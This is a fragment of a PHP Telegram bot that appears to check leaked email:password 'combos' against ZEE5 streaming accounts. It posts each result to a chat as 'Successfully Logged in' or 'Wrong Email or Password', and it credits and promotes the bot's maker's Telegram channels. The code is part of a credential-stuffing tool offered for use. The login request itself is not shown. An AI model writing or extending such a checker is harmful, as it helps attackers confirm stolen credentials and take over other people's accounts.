sendMessage($chatId, "<b>ZEE5 Account:</b>%0A<u>Combo:</u> <code>$combo</code>%0A<u>Response:</u> <b>Successfully Logged in</b>%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}else{
sendMessage($chatId, "<u>Combo:</u> <code>$combo</code>%0A<u>Response:</u> <b>Wrong Email or Password</b>%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
};
curl_close($ch);
ob_flush();
}

////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message, $message_id){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);
};

////////////////=============[]=============////////////////
////////==========[Join @TechSoham and @ZeltraxChat for more]==========////////

?>
